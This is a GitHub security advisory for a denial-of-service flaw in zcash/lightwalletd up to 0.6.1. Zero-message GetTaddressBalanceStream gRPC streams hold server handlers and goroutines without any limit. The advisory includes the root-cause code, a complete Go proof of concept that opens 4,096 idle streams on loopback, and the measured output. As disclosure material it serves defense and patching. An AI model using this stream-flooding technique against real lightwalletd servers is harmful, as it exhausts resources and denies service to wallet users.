# GHSA-4wjx-vhhv-vc8c: Zero-message `GetTaddressBalanceStream` calls retain unbounded lightwalletd handlers and goroutines

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-4wjx-vhhv-vc8c |
| CVE | none assigned |
| Severity | high |
| CWE | CWE-400 |
| Published | 2026-11-18T00:38:21Z |
| Updated | 2026-11-18T00:38:21Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-4wjx-vhhv-vc8c |

## Description (verbatim)

### Summary


The production gRPC server leaves process-wide stream admission and server-owned stream lifetime unbounded. `GetTaddressBalanceStream` enters application code before receiving a request message and immediately blocks in `Recv()`. An untrusted client can open many zero-message streams and retain one server handler and goroutine per stream indefinitely.

On lightwalletd v0.5.5, a local PoC opened 4,096 zero-message production streams multiplexed over one real TCP connection. All 4,096 handlers remained active through a two-second zero-traffic dwell. Goroutines increased by 8,197, combined client/server Go `Sys` memory increased by 77.9 MiB, and attacker cancellation released the handlers.

The measured evidence covers linear retained resources through 4,096 live streams. The High assessment follows the continued unbounded growth toward the host's finite memory and scheduler limits.

### Details


### Attacker and reachability

The attacker is an unprivileged wallet client whose stream is admitted by the deployment ingress to the ordinary `CompactTxStreamer` service. Opening the stream reaches the trigger before address validation, backend access, or chain-state processing.

The binary's default loopback bind controls the process listener. The documented architecture supports remote wallet clients through a load balancer. The report applies to streams forwarded to lightwalletd, with any external ingress limits contributing to the deployment's effective admission bound.

### Root cause

Both production server branches leave the active-stream count open, and the handler waits in `Recv()` for a client-controlled duration:

```go
// cmd/root.go
server = grpc.NewServer(
    grpc.Creds(transportCreds),
    grpc.StatsHandler(&connStatsHandler{}),
    grpc.StreamInterceptor(grpc_middleware.ChainStreamServer(
        grpc_prometheus.StreamServerInterceptor,
    )),
)

// frontend/service.go
func (s *lwdStreamer) GetTaddressBalanceStream(addresses ...) error {
    addressList := make([]string, 0)
    for {
        addr, err := addresses.Recv() // no server-owned receive deadline
        if err == io.EOF {
            break
        }
        // Validation and the 10,000-address limit run only after Recv returns.
        addressList = append(addressList, addr.Address)
    }
    // ...
}
```

grpc-go's default permits the connection to create the tested stream count. The application configures the server with the default concurrent-stream behavior and a client-controlled stream lifetime. A zero-message stream remains ahead of the per-message address validation and 10,000-address cap.

### Relationship to published advisories

GHSA-x4m7-3gpp-xc36 fixed accumulation of received address messages in `GetTaddressBalanceStream` in v0.5.0 by validating and capping the address slice. The current trigger stays before message receipt, retains the stream handler itself, and remains reproducible on v0.5.5. That advisory mentioned server-level stream duration and concurrency controls as defense in depth, so maintainers may consider this a related residual condition.

The previously fixed `GetBlockRange` advisories concern worker goroutines retained after cancellation or a blocking backend call. This path retains the production handler itself inside its first `Recv()`, before worker creation or backend access.

### Proof of concept


### Safety and isolation

This PoC binds an in-process lightwalletd gRPC server to an ephemeral loopback TCP port and opens zero-message `GetTaddressBalanceStream` streams from a local client. All traffic stays on loopback. The run stops at 4,096 streams, records the retained state, and cancels every stream before exiting.

### Requirements

- Go matching the repository's `go.mod`
- A checkout of commit `d16d48124e9ad4157ebc2324b5090c6ba201470c` (`v0.5.5`)

### Reproduction

1. Check out lightwalletd v0.5.5.
2. Create a new `poc` directory at the repository root.
3. Save the complete source shown below using the indicated filename.
4. From the repository root, run:

```sh
go run ./poc
```

The program opens 512, 1,024, 2,048, and 4,096 public client-streaming RPCs and holds each stream before its first message or half-close. An observational server interceptor counts live handlers while preserving production handler behavior. The program records retained handlers, goroutines, and runtime memory after a two-second zero-traffic dwell, then cancels all contexts.

### Complete PoC source

#### `poc/main.go`

```go
package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/zcash/lightwalletd/common"
	"github.com/zcash/lightwalletd/frontend"
	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

const (
	streamCount    = 4096
	retentionDwell = 2 * time.Second
)

func waitForCount(counter *atomic.Int64, want int64, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if counter.Load() == want {
			return true
		}
		time.Sleep(10 * time.Millisecond)
	}
	return counter.Load() == want
}

func mibDelta(after, before uint64) float64 {
	return float64(int64(after)-int64(before)) / (1024 * 1024)
}

func isCheckpoint(opened int) bool {
	return opened == 512 || opened == 1024 || opened == 2048 || opened == streamCount
}

func main() {
	common.Log = logrus.New().WithField("component", "grpc-stream-poc")
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		panic(err)
	}
	var active atomic.Int64

	// The interceptor is observational only. It records the number of handlers
	// entered but does not impose a limit or deadline.
	server := grpc.NewServer(grpc.StreamInterceptor(
		func(srv any, stream grpc.ServerStream, _ *grpc.StreamServerInfo, handler grpc.StreamHandler) error {
			active.Add(1)
			defer active.Add(-1)
			return handler(srv, stream)
		},
	))
	service, err := frontend.NewLwdStreamer(nil, "main", false)
	if err != nil {
		panic(err)
	}
	walletrpc.RegisterCompactTxStreamerServer(server, service)
	go func() {
		if err := server.Serve(listener); err != nil {
			panic(err)
		}
	}()
	defer server.Stop()

	conn, err := grpc.NewClient(listener.Addr().String(), grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	client := walletrpc.NewCompactTxStreamerClient(conn)
	fmt.Printf("reproduction transport: one real TCP connection to %s\n", listener.Addr())

	runtime.GC()
	baselineGoroutines := runtime.NumGoroutine()
	var before runtime.MemStats
	runtime.ReadMemStats(&before)
	fmt.Println("retained-resource scaling (combined in-process client/server measurement):")
	cancels := make([]context.CancelFunc, 0, streamCount)
	for i := 0; i < streamCount; i++ {
		ctx, cancel := context.WithCancel(context.Background())
		if _, err := client.GetTaddressBalanceStream(ctx); err != nil {
			cancel()
			fmt.Fprintf(os.Stderr, "opening stream %d: %v\n", i, err)
			os.Exit(1)
		}
		// Deliberately send no Address and no EOF.
		cancels = append(cancels, cancel)
		opened := i + 1
		if isCheckpoint(opened) {
			if !waitForCount(&active, int64(opened), 10*time.Second) {
				fmt.Fprintf(os.Stderr, "PoC failed at scale checkpoint: opened=%d active=%d\n", opened, active.Load())
				os.Exit(1)
			}
			runtime.GC()
			var checkpoint runtime.MemStats
			runtime.ReadMemStats(&checkpoint)
			fmt.Printf("  streams=%d active=%d goroutine_delta=%d heap=%.1fMiB stack=%.1fMiB sys=%.1fMiB\n",
				opened, active.Load(), runtime.NumGoroutine()-baselineGoroutines,
				mibDelta(checkpoint.HeapAlloc, before.HeapAlloc),
				mibDelta(checkpoint.StackInuse, before.StackInuse),
				mibDelta(checkpoint.Sys, before.Sys))
		}
	}

	if !waitForCount(&active, streamCount, 10*time.Second) {
		fmt.Fprintf(os.Stderr, "PoC failed: expected %d active handlers, got %d\n", streamCount, active.Load())
		os.Exit(1)
	}
	// No request data is sent during this dwell. A server-owned idle deadline
	// would release the handlers; the affected server keeps all of them.
	time.Sleep(retentionDwell)
	if active.Load() != streamCount {
		fmt.Fprintf(os.Stderr, "PoC failed: handlers did not remain retained: want=%d got=%d\n", streamCount, active.Load())
		os.Exit(1)
	}
	runtime.GC()
	afterGoroutines := runtime.NumGoroutine()
	var after runtime.MemStats
	runtime.ReadMemStats(&after)
	fmt.Printf("incomplete streams: %d\n", streamCount)
	fmt.Printf("active server handlers: %d\n", active.Load())
	fmt.Printf("zero-traffic retention dwell: %s\n", retentionDwell)
	fmt.Printf("goroutines: before=%d after=%d delta=%d\n", baselineGoroutines, afterGoroutines, afterGoroutines-baselineGoroutines)
	fmt.Printf("in-process retained memory deltas: heap=%.1f MiB stack=%.1f MiB sys=%.1f MiB\n",
		mibDelta(after.HeapAlloc, before.HeapAlloc),
		mibDelta(after.StackInuse, before.StackInuse),
		mibDelta(after.Sys, before.Sys))
	fmt.Printf("combined Sys-memory slope at %d streams: %.1f KiB/stream\n",
		streamCount, float64(int64(after.Sys)-int64(before.Sys))/1024/streamCount)

	for _, cancel := range cancels {
		cancel()
	}
	if !waitForCount(&active, 0, 10*time.Second) {
		fmt.Fprintf(os.Stderr, "cleanup failed: %d handlers still active\n", active.Load())
		os.Exit(1)
	}
	fmt.Println("RESOURCE RETENTION CONFIRMED: zero-message public streams retained all server handlers through the dwell and released on attacker cancellation; measured boundary=4096 streams")
}
```

### Observed output

The following is the complete output retained from the successful v0.5.5 run described above (timestamps and ephemeral port numbers may vary):

```text
reproduction transport: one real TCP connection to 127.0.0.1:55381
retained-resource scaling (combined in-process client/server measurement):
  streams=512 active=512 goroutine_delta=1029 heap=3.6MiB stack=5.6MiB sys=13.4MiB
  streams=1024 active=1024 goroutine_delta=2053 heap=6.8MiB stack=10.6MiB sys=21.5MiB
  streams=2048 active=2048 goroutine_delta=4101 heap=13.2MiB stack=20.8MiB sys=41.5MiB
  streams=4096 active=4096 goroutine_delta=8197 heap=26.2MiB stack=40.8MiB sys=77.9MiB
incomplete streams: 4096
active server handlers: 4096
zero-traffic retention dwell: 2s
goroutines: before=5 after=8202 delta=8197
in-process retained memory deltas: heap=25.9 MiB stack=40.8 MiB sys=77.9 MiB
combined Sys-memory slope at 4096 streams: 19.5 KiB/stream
RESOURCE RETENTION CONFIRMED: zero-message public streams retained all server handlers through the dwell and released on attacker cancellation; measured boundary=4096 streams
```

The retained run proves linear, timeout-free resource retention at 4,096 streams. The direct observation ends at that bounded count. A terminal outage requires the exposed deployment to admit enough concurrent streams to exhaust its resource budget.

### Impact


This is unbounded attacker-controlled resource retention. Once the HTTP/2 stream-opening frames are accepted, the attacker can stop transmitting while server handlers, goroutines, stacks and transport state remain live. The count continues to scale toward the host's finite memory and scheduler limits.

Continuing the same primitive can exhaust process resources and deny service to wallet clients of the targeted instance. The direct reproduction boundary is the reachable zero-message trigger and linear retained state through 4,096 streams; terminal exhaustion is the projected consequence at the deployment's finite resource ceiling.
